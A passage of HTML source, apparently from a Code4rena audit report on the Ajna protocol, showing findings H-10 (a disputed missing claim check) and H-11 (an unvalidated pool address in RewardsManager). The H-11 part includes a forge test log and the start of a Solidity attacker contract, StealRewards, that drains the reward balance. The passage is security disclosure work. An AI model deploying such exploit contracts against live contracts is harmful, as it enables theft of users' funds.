1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VsCode</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In case if <code>to</code> bucket is bankrupt, then clear LP for it before adding moved lp shares.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/179#issuecomment-1555097722\">MikeHathaway (Ajna) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-10-missing-isepochclaimed-validation\" style=\"position:relative;\"><a href=\"#h-10-missing-isepochclaimed-validation\" aria-label=\"h 10 missing isepochclaimed validation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/132\">[H-10] missing <code>isEpochClaimed</code> validation</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/132\">Jorgect</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/316\">shealtielanz</a> and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/152\">ABAIKUNANBAEV</a></em></p>\n<p>User can claim rewards even when is already claimed</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The _claimRewards function is using to calculate and send the reward to the caller but this function is no validating if isEpochClaimed mapping is true due that in claimRewards function is validated, see the stament in the following lines:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">file: ajna-core/src/RewardsManager.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function claimRewards(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 tokenId_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 epochToClaim_ </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        StakeInfo storage stakeInfo = stakes[tokenId_];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (msg.sender != stakeInfo.owner) revert NotOwnerOfDeposit(); </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (isEpochClaimed[tokenId_][epochToClaim_]) revert AlreadyClaimed(); // checking if the epoch was claimed;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _claimRewards(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            stakeInfo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            tokenId_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            epochToClaim_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            true,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            stakeInfo.ajnaPool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L114-L125\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L114-L125</a></p>\n<p>Now the moveStakedLiquidity is calling _claimRewards too without validate isEpochClaimed mapping:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">file: ajna-core/src/RewardsManager.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function moveStakedLiquidity(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 tokenId_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] memory fromBuckets_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] memory toBuckets_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 expiry_</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external override nonReentrant {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        StakeInfo storage stakeInfo = stakes[tokenId_];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (msg.sender != stakeInfo.owner) revert NotOwnerOfDeposit(); </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 fromBucketLength = fromBuckets_.length;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (fromBucketLength != toBuckets_.length)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            revert MoveStakedLiquidityInvalid();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address ajnaPool = stakeInfo.ajnaPool;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 curBurnEpoch = IPool(ajnaPool).currentBurnEpoch();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // claim rewards before moving liquidity, if any</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _claimRewards(stakeInfo, tokenId_, curBurnEpoch, false, ajnaPool); // no checking is isEpochClaimed is true and revert</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L135-L159\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L135-L159</a></p>\n<p>Also we can see in the _claimRewards function there is no validation is isEpochClaimed is true, this allow  a malicius user claimReward first and then move his liquidity to other bucket or the same bucket claiming the reward each time that he want.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _claimRewards(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        StakeInfo storage stakeInfo_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 tokenId_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 epochToClaim_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bool validateEpoch_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address ajnaPool_</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // revert if higher epoch to claim than current burn epoch</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            validateEpoch_ &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            epochToClaim_ &gt; IPool(ajnaPool_).currentBurnEpoch()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ) revert EpochNotAvailable();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // update bucket exchange rates and claim associated rewards</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 rewardsEarned = _updateBucketExchangeRates(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            ajnaPool_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            positionManager.getPositionIndexes(tokenId_)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        rewardsEarned += _calculateAndClaimRewards(tokenId_, epochToClaim_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] memory burnEpochsClaimed = _getBurnEpochsClaimed(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            stakeInfo_.lastClaimedEpoch,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            epochToClaim_</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit ClaimRewards(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            msg.sender,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            ajnaPool_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            tokenId_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            burnEpochsClaimed,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            rewardsEarned</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // update last interaction burn event</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        stakeInfo_.lastClaimedEpoch = uint96(epochToClaim_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // transfer rewards to sender</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _transferAjnaRewards(rewardsEarned);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Check if the isEpochClaime is true and revert in the _claimReward function</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (isEpochClaimed[tokenId_][epochToClaim_]) revert AlreadyClaimed();</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/132#issuecomment-1611598236\">ith-harvey (Ajna) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>The series of calls they are suggesting are possible:<br>\nstake<br>\nclaimRewards() -> get rewards<br>\nmoveStakedLiquidity() ->  get rewards</p>\n<p>They should not be able to get these rewards because <code>_calculateAndClaimRewards()</code> iterates from last claimed epoch.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-11-rewardsmanager-fails-to-validate-pool_-when-updating-exchange-rates-allowing-rewards-to-be-drained\" style=\"position:relative;\"><a href=\"#h-11-rewardsmanager-fails-to-validate-pool_-when-updating-exchange-rates-allowing-rewards-to-be-drained\" aria-label=\"h 11 rewardsmanager fails to validate pool_ when updating exchange rates allowing rewards to be drained permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/8\">[H-11] RewardsManager fails to validate <code>pool_</code> when updating exchange rates allowing rewards to be drained</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/8\">vakzz</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/207\">0xWaitress</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/151\">SpicyMeatball</a>, and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/64\">0xStalin</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L310-L318\">https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L310-L318</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L794-L794\">https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L794-L794</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L811-L821\">https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L811-L821</a></p>\n<p>The <code>updateBucketExchangeRatesAndClaim</code> method is designed to reward people for keeping the current exchange rate up to date (it has the following description: “Caller can claim <code>5%</code> of the rewards that have accumulated to each bucket since the last burn event, if it hasn’t already been updated”).</p>\n<p>The issue is that there is no check on the <code>pool_</code> to ensure that is a valid ajna pool or that it is a pool from a currently staked token.</p>\n<p>This means that an attacker can supply their own contract to control all of the values used to calculate the reward amount, allowing them to transfer an arbitrary amount of reward tokens (up to the balance of the rewards manager).</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following test can be placed in <a href=\"https://github.com/code-423n4/2023-05-ajna/tree/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/tests/forge/unit/Rewards\">https://github.com/code-423n4/2023-05-ajna/tree/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/tests/forge/unit/Rewards</a> as <code>StealRewards.t.sol</code> and then run with <code>forge test -m testStealRewards -vv</code>, showing that an attacker can steal all of the ajna tokens held by the rewards manager:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"bash\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">$ forge </span><span class=\"mtk11\">test</span><span class=\"mtk1\">  -m testStealRewards -vv</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Running 1 </span><span class=\"mtk11\">test</span><span class=\"mtk1\"> </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> tests/forge/unit/Rewards/StealRewards.t.sol:StealRewardsTest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[PASS] </span><span class=\"mtk11\">testStealRewards</span><span class=\"mtk1\">() (gas: 494833)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Logs:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  Rewards balance before: 100000000000000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  Hacker balance before </span><span class=\"mtk11\">:</span><span class=\"mtk1\"> 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  Rewards balance after </span><span class=\"mtk11\">:</span><span class=\"mtk1\"> 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  Hacker balance after  </span><span class=\"mtk11\">:</span><span class=\"mtk1\"> 100000000000000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Test result: ok. 1 passed; 0 failed; finished </span><span class=\"mtk15\">in</span><span class=\"mtk1\"> 6.57s</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: UNLICENSED</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">14</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;src/RewardsManager.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;src/PositionManager.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;@std/Test.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;@std/Vm.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">StealRewards</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ajnaToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IRewardsManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardsManager</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_currentBurnEpoch</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toSteal</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ajnaToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IRewardsManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_rewardsManager</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ajnaToken</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_ajnaToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rewardsManager</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_rewardsManager</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">currentBurnEpoch</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_currentBurnEpoch</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bucketExchangeRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_currentBurnEpoch</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">burnInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">burnBlock_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalInterest_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalBurned_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">index</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">toSteal</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">20</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 